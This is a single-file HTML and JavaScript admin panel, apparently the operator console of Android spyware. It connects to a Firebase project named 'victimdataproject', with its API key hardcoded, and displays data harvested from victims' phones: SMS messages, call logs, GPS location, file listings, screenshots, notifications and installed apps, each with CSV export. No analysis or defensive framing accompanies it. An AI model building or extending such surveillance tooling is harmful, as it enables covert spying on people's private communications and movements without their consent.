<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Device Monitor</title>
    
    <!-- TailwindCSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Font Awesome Icons CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <!-- Custom Styles and Tailwind Config -->
    <style type="text/tailwindcss">
        @layer utilities {
            .no-scrollbar::-webkit-scrollbar {
                display: none;
            }
            .no-scrollbar {
                -ms-overflow-style: none;
                scrollbar-width: none;
            }
        }
    </style>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        'gray-900': '#121212',
                        'gray-800': '#1e1e1e',
                        'gray-700': '#2d2d2d',
                        'gray-600': '#444444',
                        'gray-400': '#a0a0a0',
                        'cyan-500': '#06b6d4',
                        'cyan-600': '#0891b2',
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-gray-900 text-gray-300 font-sans antialiased">

    <!-- LOGIN SCREEN -->
    <div id="login-container" class="flex items-center justify-center min-h-screen">
        <div class="w-full max-w-md p-8 space-y-6 bg-gray-800 rounded-lg shadow-lg">
            <div class="text-center">
                <i class="fas fa-user-shield fa-3x text-cyan-500"></i>
                <h1 class="mt-4 text-2xl font-bold text-white">Admin Panel Login</h1>
                <p class="text-gray-400">Please sign in to continue</p>
            </div>
            <form id="login-form" class="space-y-6">
                <div>
                    <label for="email" class="text-sm font-bold text-gray-400 block">Email</label>
                    <input id="email" type="email" required class="w-full px-4 py-2 mt-2 text-gray-300 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-cyan-500" placeholder="admin@example.com">
                </div>
                <div>
                    <label for="password" class="text-sm font-bold text-gray-400 block">Password</label>
                    <input id="password" type="password" required class="w-full px-4 py-2 mt-2 text-gray-300 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-cyan-500" placeholder="••••••••">
                </div>
                <div id="login-error" class="text-red-400 text-sm hidden"></div>
                <button type="submit" class="w-full px-4 py-2 font-bold text-white bg-cyan-600 rounded-md hover:bg-cyan-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-gray-800 focus:ring-cyan-500 transition duration-200">
                    Sign In
                </button>
            </form>
        </div>
    </div>

    <!-- MAIN APP CONTAINER (Hidden by default) -->
    <div id="app-container" class="hidden">
        <div class="flex h-screen bg-gray-900">
            <!-- Sidebar -->
            <aside id="sidebar" class="w-64 bg-gray-800 shadow-lg flex-shrink-0 transition-all duration-300 ease-in-out -translate-x-full md:translate-x-0 md:relative">
                <div class="p-4 border-b border-gray-700 flex items-center justify-between">
                    <h1 class="text-xl font-bold text-white"><i class="fas fa-tachometer-alt mr-2"></i>Admin Panel</h1>
                    <button id="sidebar-close" class="md:hidden text-gray-400 hover:text-white">
                        <i class="fas fa-times fa-lg"></i>
                    </button>
                </div>
                <nav id="main-nav" class="p-4 space-y-2">
                    <!-- Nav items will be injected by JS -->
                </nav>
            </aside>

            <!-- Main Content -->
            <div class="flex-1 flex flex-col overflow-hidden">
                <!-- Header -->
                <header class="flex items-center justify-between p-4 bg-gray-800 border-b border-gray-700 shadow-md">
                    <div class="flex items-center">
                        <button id="sidebar-open" class="md:hidden text-gray-400 hover:text-white mr-4">
                            <i class="fas fa-bars fa-lg"></i>
                        </button>
                        <h2 id="page-title" class="text-xl font-semibold text-white">Dashboard</h2>
                    </div>
                    <div class="flex items-center space-x-4">
                        <span id="admin-email" class="text-sm text-gray-400 hidden md:block"></span>
                        <button id="logout-button" class="flex items-center px-3 py-2 text-sm font-medium text-white bg-red-600 rounded-md hover:bg-red-500">
                            <i class="fas fa-sign-out-alt mr-2"></i> Logout
                        </button>
                    </div>
                </header>

                <!-- Content Area -->
                <main id="main-content" class="flex-1 p-4 lg:p-6 overflow-y-auto no-scrollbar">
                    <!-- Dynamic content will be loaded here -->
                </main>
            </div>
        </div>
    </div>
    
    <!-- Fullscreen Image Modal -->
    <div id="image-modal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
        <span id="close-modal" class="absolute top-4 right-6 text-white text-4xl font-bold cursor-pointer">×</span>
        <img id="modal-image" class="max-w-[90vw] max-h-[90vh]" src="">
    </div>


    <!-- Firebase SDKs -->
    <script type="module">
        // Import Firebase modules
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // --- Firebase Configuration ---
        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
            authDomain: "victimdataproject.firebaseapp.com",
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
            projectId: "victimdataproject",
            storageBucket: "victimdataproject.appspot.com",
            messagingSenderId: "938788267301",
            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
        };

        // --- Initialize Firebase ---
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        // --- Global State ---
        let allDevicesData = {};
        let currentView = 'dashboard';
        let selectedDeviceId = null;

        // --- UI Elements ---
        const loginContainer = document.getElementById('login-container');
        const appContainer = document.getElementById('app-container');
        const loginForm = document.getElementById('login-form');
        const loginError = document.getElementById('login-error');
        const logoutButton = document.getElementById('logout-button');
        const adminEmailSpan = document.getElementById('admin-email');
        const mainContent = document.getElementById('main-content');
        const pageTitle = document.getElementById('page-title');
        const mainNav = document.getElementById('main-nav');
        
        // --- Sidebar Navigation ---
        const navItems = [
            { id: 'dashboard', icon: 'fa-tachometer-alt', text: 'Dashboard' },
            { id: 'devices', icon: 'fa-mobile-alt', text: 'Devices' }
        ];

        const deviceNavItems = [
            { id: 'device-info', icon: 'fa-circle-info', text: 'Device Info' },
            { id: 'sms', icon: 'fa-comment-sms', text: 'SMS Logs' },
            { id: 'calls', icon: 'fa-phone', text: 'Call Logs' },
            { id: 'apps', icon: 'fa-th-large', text: 'Installed Apps' },
            { id: 'location', icon: 'fa-map-marker-alt', text: 'Location' },
            { id: 'battery', icon: 'fa-battery-half', text: 'Battery' },
            { id: 'files', icon: 'fa-folder-open', text: 'File Logs' },
            { id: 'screenshots', icon: 'fa-camera', text: 'Screenshots' },
            { id: 'notifications', icon: 'fa-bell', text: 'Notifications' },
        ];
        
        /**
         * Initializes the application, sets up auth listeners and UI events.
         */
        const init = () => {
            handleAuth();
            setupEventListeners();
        };

        /**
         * Manages authentication state changes.
         */
        const handleAuth = () => {
            onAuthStateChanged(auth, user => {
                if (user) {
                    // User is signed in
                    loginContainer.classList.add('hidden');
                    appContainer.classList.remove('hidden');
                    adminEmailSpan.textContent = user.email;
                    startDataListeners();
                    renderNav(navItems);
                    navigateTo('dashboard');
                } else {
                    // User is signed out
                    loginContainer.classList.remove('hidden');
                    appContainer.classList.add('hidden');
                    stopDataListeners();
                }
            });
        };

        /**
         * Sets up all event listeners for the application.
         */
        const setupEventListeners = () => {
            // Login
            loginForm.addEventListener('submit', async (e) => {
                e.preventDefault();
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
                try {
                    await signInWithEmailAndPassword(auth, email, password);
                    loginError.classList.add('hidden');
                } catch (error) {
                    loginError.textContent = getFriendlyAuthError(error.code);
                    loginError.classList.remove('hidden');
                }
            });

            // Logout
            logoutButton.addEventListener('click', () => signOut(auth));
            
            // Responsive Sidebar
            document.getElementById('sidebar-open').addEventListener('click', () => {
                document.getElementById('sidebar').classList.remove('-translate-x-full');
            });
            document.getElementById('sidebar-close').addEventListener('click', () => {
                document.getElementById('sidebar').classList.add('-translate-x-full');
            });

            // Modal
            document.getElementById('close-modal').addEventListener('click', () => {
                document.getElementById('image-modal').classList.add('hidden');
            });
        };
        
        // --- Data Fetching and Listeners ---
        let devicesListener = null;

        const startDataListeners = () => {
            const devicesRef = ref(db, 'devices');
            devicesListener = onValue(devicesRef, (snapshot) => {
                allDevicesData = snapshot.val() || {};
                // Re-render the current view with fresh data
                if (currentView === 'dashboard') renderDashboard();
                if (currentView === 'devices') renderDeviceList();
                if (selectedDeviceId && allDevicesData[selectedDeviceId]) {
                     // If a specific device view is active, refresh it
                     navigateTo(currentView, selectedDeviceId, true); 
                }
            });
        };

        const stopDataListeners = () => {
            if (devicesListener) {
                devicesListener(); // This is how you unsubscribe in Firebase v9
                devicesListener = null;
            }
        };

        // --- Navigation and Rendering ---
        
        const renderNav = (items) => {
            mainNav.innerHTML = items.map(item => `
                <a href="#" data-view="${item.id}" class="nav-link flex items-center px-4 py-2 text-gray-400 rounded-md hover:bg-gray-700 hover:text-white transition-colors duration-200">
                    <i class="fas ${item.icon} w-6"></i>
                    <span>${item.text}</span>
                </a>
            `).join('');
            
            // Add click listeners to new nav items
            mainNav.querySelectorAll('.nav-link').forEach(link => {
                link.addEventListener('click', e => {
                    e.preventDefault();
                    const viewId = link.dataset.view;
                    const isDeviceSpecific = deviceNavItems.some(item => item.id === viewId);
                    
                    if (isDeviceSpecific && selectedDeviceId) {
                        navigateTo(viewId, selectedDeviceId);
                    } else if (!isDeviceSpecific) {
                        if(viewId === 'devices') selectedDeviceId = null; // Clear selected device when going to main list
                        navigateTo(viewId);
                    }
                    if (window.innerWidth < 768) { // Close sidebar on mobile nav click
                       document.getElementById('sidebar').classList.add('-translate-x-full');
                    }
                });
            });
        };
        
        const navigateTo = (viewId, deviceId = null, isRefresh = false) => {
             if (!isRefresh) { // Don't change view context on refresh
                currentView = viewId;
                selectedDeviceId = deviceId;
            }

            // Update active link style
            mainNav.querySelectorAll('.nav-link').forEach(link => {
                link.classList.toggle('bg-gray-700', link.dataset.view === viewId);
                link.classList.toggle('text-white', link.dataset.view === viewId);
            });

            if (selectedDeviceId) {
                const device = allDevicesData[selectedDeviceId];
                const alias = device?.info?.alias || selectedDeviceId;
                pageTitle.innerHTML = `<i class="fa-solid fa-mobile-screen-button mr-3"></i> ${alias}`;
                if (!isRefresh) renderNav([...navItems, ...deviceNavItems]);
            } else {
                renderNav(navItems);
            }
            
            switch (viewId) {
                case 'dashboard':
                    pageTitle.textContent = 'Dashboard';
                    renderDashboard();
                    break;
                case 'devices':
                    pageTitle.textContent = 'Connected Devices';
                    renderDeviceList();
                    break;
                case 'device-info':
                    renderDeviceInfo(selectedDeviceId);
                    break;
                case 'sms':
                    renderPaginatedTable(selectedDeviceId, 'sms', ['Timestamp', 'Address', 'Body', 'Type'], ['date', 'address', 'body', 'type']);
                    break;
                case 'calls':
                    renderPaginatedTable(selectedDeviceId, 'calls', ['Date', 'Number', 'Duration (s)', 'Type'], ['date', 'number', 'duration', 'type']);
                    break;
                case 'apps':
                     renderPaginatedTable(selectedDeviceId, 'apps', ['App Name', 'Package Name', 'Type'], ['appName', 'packageName', 'appType']);
                    break;
                case 'location':
                    renderLocation(selectedDeviceId);
                    break;
                case 'battery':
                    renderBattery(selectedDeviceId);
                    break;
                case 'files':
                    renderPaginatedTable(selectedDeviceId, 'files', ['Folder', 'File Name', 'Path', 'Size'], ['folder', 'fileName', 'path', 'size']);
                    break;
                case 'screenshots':
                    renderScreenshots(selectedDeviceId);
                    break;
                case 'notifications':
                    renderPaginatedTable(selectedDeviceId, 'notifications', ['Time', 'App', 'Title', 'Content'], ['postTime', 'appName', 'title', 'content']);
                    break;
            }
        };

        // --- RENDER FUNCTIONS ---
        
        const renderDashboard = () => {
            const deviceIds = Object.keys(allDevicesData);
            const totalDevices = deviceIds.length;
            const onlineDevices = deviceIds.filter(id => allDevicesData[id]?.status?.isOnline).length;

            let totalSms = 0, totalCalls = 0, totalScreenshots = 0;
            deviceIds.forEach(id => {
                totalSms += Object.keys(allDevicesData[id].sms || {}).length;
                totalCalls += Object.keys(allDevicesData[id].calls || {}).length;
                totalScreenshots += Object.keys(allDevicesData[id].screenshots || {}).length;
            });

            const stats = [
                { icon: 'fa-mobile-alt', label: 'Total Devices', value: totalDevices, color: 'bg-blue-500' },
                { icon: 'fa-wifi', label: 'Online Devices', value: onlineDevices, color: 'bg-green-500' },
                { icon: 'fa-comment-sms', label: 'Total SMS Logs', value: totalSms, color: 'bg-yellow-500' },
                { icon: 'fa-phone', label: 'Total Call Logs', value: totalCalls, color: 'bg-purple-500' },
                { icon: 'fa-camera', label: 'Total Screenshots', value: totalScreenshots, color: 'bg-indigo-500' },
            ];

            mainContent.innerHTML = `
                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-4 lg:gap-6">
                    ${stats.map(stat => `
                        <div class="p-4 rounded-lg shadow-lg flex items-center ${stat.color}">
                            <div class="p-3 rounded-full bg-black bg-opacity-20 mr-4">
                               <i class="fas ${stat.icon} fa-2x text-white"></i>
                            </div>
                            <div>
                                <p class="text-sm text-gray-200 font-medium">${stat.label}</p>
                                <p class="text-3xl font-bold text-white">${stat.value}</p>
                            </div>
                        </div>
                    `).join('')}
                </div>
                <div class="mt-8 bg-gray-800 p-6 rounded-lg shadow-lg">
                    <h3 class="text-xl font-semibold mb-4 text-white">Recent Activity</h3>
                    <p class="text-gray-400">This panel provides real-time data from all connected devices. Device status and logs update automatically.</p>
                </div>
            `;
        };

        const renderDeviceList = () => {
            const deviceIds = Object.keys(allDevicesData);

            if (deviceIds.length === 0) {
                mainContent.innerHTML = getEmptyStateHTML('No devices connected yet.');
                return;
            }
            
            mainContent.innerHTML = `
                <div class="bg-gray-800 rounded-lg shadow-lg overflow-hidden">
                    <div class="p-4">
                        <input id="device-search" type="text" placeholder="Search by name or UID..." class="w-full bg-gray-700 text-white p-2 rounded-md border border-gray-600 focus:outline-none focus:ring-2 focus:ring-cyan-500">
                    </div>
                    <div class="overflow-x-auto">
                        <table class="w-full text-left">
                            <thead class="bg-gray-700 text-gray-300 uppercase text-sm">
                                <tr>
                                    <th class="p-4">Alias / Name</th>
                                    <th class="p-4">UID</th>
                                    <th class="p-4">Status</th>
                                    <th class="p-4">Last Seen</th>
                                    <th class="p-4">Android Version</th>
                                    <th class="p-4">Actions</th>
                                </tr>
                            </thead>
                            <tbody id="device-list-body">
                                ${deviceIds.map(id => {
                                    const device = allDevicesData[id];
                                    const info = device.info || {};
                                    const status = device.status || {};
                                    const alias = info.alias || info.device || 'Unknown Device';
                                    const isOnline = status.isOnline || false;
                                    
                                    return `
                                    <tr class="device-row border-b border-gray-700 hover:bg-gray-700/50" data-uid="${id}" data-alias="${alias.toLowerCase()}">
                                        <td class="p-4 font-medium text-white">${alias}</td>
                                        <td class="p-4 text-gray-400 font-mono text-sm">${id}</td>
                                        <td class="p-4">
                                            <span class="px-2 py-1 text-xs font-bold rounded-full ${isOnline ? 'bg-green-500 text-white' : 'bg-gray-600 text-gray-300'}">
                                                ${isOnline ? 'Online' : 'Offline'}
                                            </span>
                                        </td>
                                        <td class="p-4 text-gray-400">${isOnline ? 'Now' : formatTimeAgo(status.lastSeen)}</td>
                                        <td class="p-4 text-gray-400">${info.androidVersion || 'N/A'}</td>
                                        <td class="p-4">
                                            <button class="view-device-btn text-cyan-500 hover:text-cyan-400" data-uid="${id}">View Details</button>
                                        </td>
                                    </tr>
                                    `
                                }).join('')}
                            </tbody>
                        </table>
                    </div>
                </div>
            `;
            
            // Add event listeners
            document.querySelectorAll('.view-device-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    const uid = btn.dataset.uid;
                    navigateTo('device-info', uid);
                });
            });

            document.getElementById('device-search').addEventListener('keyup', (e) => {
                const searchTerm = e.target.value.toLowerCase();
                document.querySelectorAll('.device-row').forEach(row => {
                    const uid = row.dataset.uid.toLowerCase();
                    const alias = row.dataset.alias.toLowerCase();
                    row.style.display = (uid.includes(searchTerm) || alias.includes(searchTerm)) ? '' : 'none';
                });
            });
        };
        
        const renderDeviceInfo = (deviceId) => {
            const device = allDevicesData[deviceId];
            if (!device || !device.info) {
                mainContent.innerHTML = getEmptyStateHTML("Device info not available.");
                return;
            }
            const info = device.info;
            const infoList = [
                { label: 'Device Model', value: info.model || 'N/A', icon: 'fa-mobile-screen' },
                { label: 'Android Version', value: info.androidVersion || 'N/A', icon: 'fa-robot' },
                { label: 'IP Address', value: info.ip || 'N/A', icon: 'fa-network-wired' },
                { label: 'SIM Info', value: info.simInfo || 'N/A', icon: 'fa-sim-card' },
                { label: 'Registered On', value: info.registrationTime ? new Date(info.registrationTime).toLocaleString() : 'N/A', icon: 'fa-clock' },
                { label: 'Device UID', value: deviceId, icon: 'fa-fingerprint' }
            ];

            mainContent.innerHTML = `
                <div class="bg-gray-800 rounded-lg shadow-lg p-6">
                    <h3 class="text-xl font-semibold mb-6 text-white border-b border-gray-700 pb-4">Device Information</h3>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="col-span-1 md:col-span-2">
                             <label for="device-alias" class="text-sm font-bold text-gray-400 block">Device Alias</label>
                             <div class="flex items-center space-x-2 mt-2">
                                <input id="device-alias-input" type="text" value="${info.alias || ''}" placeholder="Set a custom name" class="flex-grow bg-gray-700 text-white p-2 rounded-md border border-gray-600 focus:outline-none focus:ring-2 focus:ring-cyan-500">
                                <button id="save-alias-btn" class="px-4 py-2 font-bold text-white bg-cyan-600 rounded-md hover:bg-cyan-500">Save</button>
                             </div>
                        </div>
                        ${infoList.map(item => `
                            <div class="flex items-start">
                                <i class="fas ${item.icon} text-cyan-500 w-6 mt-1"></i>
                                <div class="ml-4">
                                    <p class="font-semibold text-gray-400">${item.label}</p>
                                    <p class="text-white break-all">${item.value}</p>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                </div>
            `;
            // Note: Saving alias is a "write" operation. This example focuses on "read", but the code to save would be:
            // import { set, ref } from 'firebase/database';
            // document.getElementById('save-alias-btn').addEventListener('click', () => {
            //     const newAlias = document.getElementById('device-alias-input').value;
            //     set(ref(db, `devices/${deviceId}/info/alias`), newAlias);
            //     // Add a success message
            // });
        };
        
        const renderPaginatedTable = (deviceId, dataType, headers, dataKeys) => {
            const device = allDevicesData[deviceId];
            const dataObject = device?.[dataType];
            const dataArray = dataObject ? Object.values(dataObject) : [];
            // Sort by timestamp if available (newest first)
            if(dataArray.length > 0 && (dataArray[0].date || dataArray[0].postTime)) {
                dataArray.sort((a,b) => (b.date || b.postTime) - (a.date || a.postTime));
            }

            const title = dataType.charAt(0).toUpperCase() + dataType.slice(1);
            if (dataArray.length === 0) {
                mainContent.innerHTML = getEmptyStateHTML(`No ${title} logs available.`);
                return;
            }
            
            // For simplicity in this single file, pagination logic is basic.
            // A full implementation would involve more complex state management.
            const itemsPerPage = 25;
            const totalPages = Math.ceil(dataArray.length / itemsPerPage);
            
            const renderTablePage = (page = 1) => {
                const start = (page - 1) * itemsPerPage;
                const end = start + itemsPerPage;
                const pageData = dataArray.slice(start, end);

                mainContent.innerHTML = `
                    <div class="bg-gray-800 rounded-lg shadow-lg">
                        <div class="p-4 flex justify-between items-center border-b border-gray-700">
                            <h3 class="text-xl font-semibold text-white">${title} Logs</h3>
                            <button id="export-csv-btn" class="px-3 py-1 bg-green-600 text-white rounded-md hover:bg-green-500 text-sm"><i class="fas fa-file-csv mr-2"></i>Export to CSV</button>
                        </div>
                        <div class="overflow-x-auto">
                            <table class="w-full text-left">
                                <thead class="bg-gray-700 text-gray-300 uppercase text-sm">
                                    <tr>${headers.map(h => `<th class="p-4">${h}</th>`).join('')}</tr>
                                </thead>
                                <tbody>
                                    ${pageData.map(item => `
                                        <tr class="border-b border-gray-700 hover:bg-gray-700/50">
                                            ${dataKeys.map(key => {
                                                let value = item[key] || 'N/A';
                                                // Format timestamps
                                                if ((key === 'date' || key === 'postTime') && typeof value === 'number') {
                                                    value = new Date(value).toLocaleString();
                                                }
                                                // Truncate long text
                                                if (key === 'body' || key === 'content') {
                                                    value = value.length > 100 ? value.substring(0, 100) + '...' : value;
                                                }
                                                return `<td class="p-4 text-gray-400 whitespace-nowrap">${value}</td>`;
                                            }).join('')}
                                        </tr>
                                    `).join('')}
                                </tbody>
                            </table>
                        </div>
                        <div id="pagination-controls" class="p-4 flex justify-between items-center text-sm">
                             <span>Showing ${start + 1}-${Math.min(end, dataArray.length)} of ${dataArray.length}</span>
                             <div>
                                <!-- Pagination buttons would be added here -->
                             </div>
                        </div>
                    </div>
                `;
                
                document.getElementById('export-csv-btn').addEventListener('click', () => {
                     exportToCSV(dataArray, headers, dataKeys, `${dataType}_${deviceId}.csv`);
                });
            };
            
            renderTablePage(1); // Render first page initially
        };
        
        const renderLocation = (deviceId) => {
            const location = allDevicesData[deviceId]?.location;
            if (!location || !location.latitude) {
                mainContent.innerHTML = getEmptyStateHTML("No location data available.");
                return;
            }
            
            const lat = location.latitude;
            const lon = location.longitude;
            const googleMapsUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
            
            mainContent.innerHTML = `
                <div class="bg-gray-800 rounded-lg shadow-lg p-6">
                    <h3 class="text-xl font-semibold mb-4 text-white">Last Known Location</h3>
                    <div class="bg-gray-700 h-64 md:h-96 rounded-lg mb-4 flex items-center justify-center">
                       <a href="${googleMapsUrl}" target="_blank" class="text-center p-4">
                           <i class="fas fa-map-marked-alt fa-4x text-cyan-400"></i>
                           <p class="mt-4 font-bold text-lg">View on Google Maps</p>
                           <p class="text-sm text-gray-400">(Opens in new tab)</p>
                       </a>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-center md:text-left">
                        <div>
                            <p class="text-sm text-gray-400">Latitude</p>
                            <p class="font-mono text-lg text-white">${lat}</p>
                        </div>
                        <div>
                            <p class="text-sm text-gray-400">Longitude</p>
                            <p class="font-mono text-lg text-white">${lon}</p>
                        </div>
                        <div>
                            <p class="text-sm text-gray-400">Last Updated</p>
                            <p class="text-lg text-white">${formatTimeAgo(location.timestamp)}</p>
                        </div>
                    </div>
                </div>
            `;
        };
        
        const renderBattery = (deviceId) => {
            const battery = allDevicesData[deviceId]?.battery;
            if (!battery) {
                 mainContent.innerHTML = getEmptyStateHTML("No battery data available.");
                return;
            }
            const level = battery.level || 0;
            const isCharging = battery.isCharging || false;
            const statusText = isCharging ? 'Charging' : 'Discharging';
            const statusIcon = isCharging ? 'fa-bolt' : 'fa-battery-half';
            const levelColor = level > 50 ? 'bg-green-500' : level > 20 ? 'bg-yellow-500' : 'bg-red-500';
            
            mainContent.innerHTML = `
                <div class="bg-gray-800 rounded-lg shadow-lg p-6">
                     <h3 class="text-xl font-semibold mb-6 text-white">Battery Status</h3>
                     <div class="flex items-center space-x-6">
                        <div class="relative">
                            <i class="fas fa-battery-full fa-6x text-gray-600"></i>
                            <div class="absolute top-0 left-0 h-full w-full flex items-center justify-center text-xl font-bold text-white">${level}%</div>
                        </div>
                        <div class="flex-1">
                            <p class="text-lg font-semibold text-gray-300">Current Level: ${level}%</p>
                            <div class="w-full bg-gray-600 rounded-full h-4 my-2">
                                <div class="${levelColor} h-4 rounded-full" style="width: ${level}%"></div>
                            </div>
                            <div class="mt-4 flex items-center text-gray-300">
                                <i class="fas ${statusIcon} mr-3 text-cyan-400"></i>
                                <span>Status: <span class="font-semibold">${statusText}</span></span>
                            </div>
                            <p class="text-sm text-gray-400 mt-2">Last updated: ${formatTimeAgo(battery.timestamp)}</p>
                        </div>
                     </div>
                </div>
            `;
        };
        
        const renderScreenshots = (deviceId) => {
            const screenshots = allDevicesData[deviceId]?.screenshots;
            const screenshotArray = screenshots ? Object.values(screenshots) : [];
             if (screenshotArray.length === 0) {
                mainContent.innerHTML = getEmptyStateHTML("No screenshots available.");
                return;
            }
            
            mainContent.innerHTML = `
                <div class="bg-gray-800 rounded-lg shadow-lg p-4">
                     <h3 class="text-xl font-semibold mb-4 text-white">Screenshots</h3>
                     <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-4">
                        ${screenshotArray.map(ss => `
                            <div class="aspect-w-9 aspect-h-16 bg-gray-700 rounded-lg overflow-hidden cursor-pointer group">
                                <img src="${ss.url}" data-full-url="${ss.url}" class="screenshot-thumb object-cover w-full h-full transition-transform duration-300 group-hover:scale-110" loading="lazy" alt="Screenshot taken at ${new Date(ss.timestamp).toLocaleString()}">
                            </div>
                        `).join('')}
                     </div>
                </div>
            `;
            
            document.querySelectorAll('.screenshot-thumb').forEach(thumb => {
                thumb.addEventListener('click', () => {
                    document.getElementById('modal-image').src = thumb.dataset.fullUrl;
                    document.getElementById('image-modal').classList.remove('hidden');
                });
            });
        };

        // --- HELPER FUNCTIONS ---
        
        const getFriendlyAuthError = (code) => {
            switch (code) {
                case 'auth/user-not-found':
                case 'auth/wrong-password':
                case 'auth/invalid-credential':
                    return 'Invalid email or password.';
                case 'auth/invalid-email':
                    return 'Please enter a valid email address.';
                default:
                    return 'An unknown error occurred. Please try again.';
            }
        };

        const formatTimeAgo = (timestamp) => {
            if (!timestamp) return 'never';
            const now = new Date();
            const seconds = Math.floor((now - new Date(timestamp)) / 1000);
            let interval = seconds / 31536000;
            if (interval > 1) return Math.floor(interval) + " years ago";
            interval = seconds / 2592000;
            if (interval > 1) return Math.floor(interval) + " months ago";
            interval = seconds / 86400;
            if (interval > 1) return Math.floor(interval) + " days ago";
            interval = seconds / 3600;
            if (interval > 1) return Math.floor(interval) + " hours ago";
            interval = seconds / 60;
            if (interval > 1) return Math.floor(interval) + " mins ago";
            return Math.floor(seconds) + " secs ago";
        };
        
        const getEmptyStateHTML = (message) => {
            return `
                <div class="flex flex-col items-center justify-center h-full text-center text-gray-500 p-8 bg-gray-800 rounded-lg shadow-lg">
                    <i class="fas fa-box-open fa-4x mb-4"></i>
                    <h3 class="text-xl font-semibold text-gray-400">No Data Found</h3>
                    <p>${message}</p>
                </div>
            `;
        };

        const exportToCSV = (dataArray, headers, keys, filename) => {
            const csvRows = [];
            // Add headers
            csvRows.push(headers.join(','));

            // Add data rows
            for (const row of dataArray) {
                const values = keys.map(key => {
                    let cell = row[key] === null || row[key] === undefined ? '' : row[key];
                    // Handle values that might contain commas
                    if (typeof cell === 'string' && cell.includes(',')) {
                        cell = `"${cell}"`;
                    }
                     if ((key === 'date' || key === 'postTime') && typeof cell === 'number') {
                        cell = `"${new Date(cell).toLocaleString()}"`;
                    }
                    return cell;
                });
                csvRows.push(values.join(','));
            }

            const csvString = csvRows.join('\n');
            const blob = new Blob([csvString], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.setAttribute('hidden', '');
            a.setAttribute('href', url);
            a.setAttribute('download', filename);
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        };
        
        // --- Start the App ---
        init();
    </script>
</body>
</html>